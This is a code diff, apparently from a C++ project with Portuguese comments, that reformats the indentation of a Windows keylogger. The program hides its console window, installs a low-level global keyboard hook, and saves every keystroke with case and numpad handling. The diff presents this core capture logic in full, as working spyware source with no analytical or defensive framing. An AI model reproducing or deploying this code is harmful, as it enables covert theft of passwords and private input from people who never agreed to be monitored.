@@ -69,23 +69,23 @@ LRESULT CALLBACK KeyboardHook(int nCode, WPARAM wParam, LPARAM lParam) {
             bool capital = (GetKeyState(VK_CAPITAL) & 0x0001) != 0;
             bool isSpecialKey = std::find(std::begin(special_keys), std::end(special_keys), ascii) != std::end(special_keys);
 
-			if(isSpecialKey){
-				SaveData(SpecialKeys(ascii));
-			}else{
-				// NUMLOCK
-				// 96 ... 105 = a ... j
-				// 96-48 ... 105-48 = 0 ... 9
-				if (ascii >= 96 && ascii <= 105){
-					ascii -= 48;
-				}
+	if(isSpecialKey){
+		SaveData(SpecialKeys(ascii));
+	}else{
+		// NUMLOCK
+		// 96 ... 105 = a ... j
+		// 96-48 ... 105-48 = 0 ... 9
+		if (ascii >= 96 && ascii <= 105){
+			ascii -= 48;
+		}
 				
-				// ascii 65 ... 90 =  A ... Z
-				// ascii 65+32 ... 90+32 = a ... z
-	            if ((ascii >= 65 && ascii <= 90) && !capital){
-	            	ascii += 32; // muda o ascii para o de letra minuscula
-				}
-	            SaveData(std::string(1, (char)ascii));
-	    	}
+		// ascii 65 ... 90 =  A ... Z
+		// ascii 65+32 ... 90+32 = a ... z
+		if ((ascii >= 65 && ascii <= 90) && !capital){
+			ascii += 32; // muda o ascii para o de letra minuscula
+		}
+		SaveData(std::string(1, (char)ascii));
+		}
         }
     }
     return CallNextHookEx(NULL, nCode, wParam, lParam);
@@ -95,18 +95,18 @@ int main() {
 	// Fecha a janela do terminal
 	FreeConsole();
 	
-    // Instala o gancho de teclado
-    HHOOK hook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardHook, NULL, 0);
-
-    // Mantém o programa em execução
-    MSG msg;
-    while (GetMessage(&msg, NULL, 0, 0)) {
-        TranslateMessage(&msg);
-        DispatchMessage(&msg);
-    }
-
-    // Remove o gancho de teclado antes de encerrar o programa
-    UnhookWindowsHookEx(hook);
-
-    return 0;
+	// Instala o gancho de teclado
+	HHOOK hook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardHook, NULL, 0);
+	
+	// Mantém o programa em execução
+	MSG msg;
+	while (GetMessage(&msg, NULL, 0, 0)) {
+		TranslateMessage(&msg);
+		DispatchMessage(&msg);
+	}
+	
+	// Remove o gancho de teclado antes de encerrar o programa
+	UnhookWindowsHookEx(hook);
+	
+	return 0;
 }
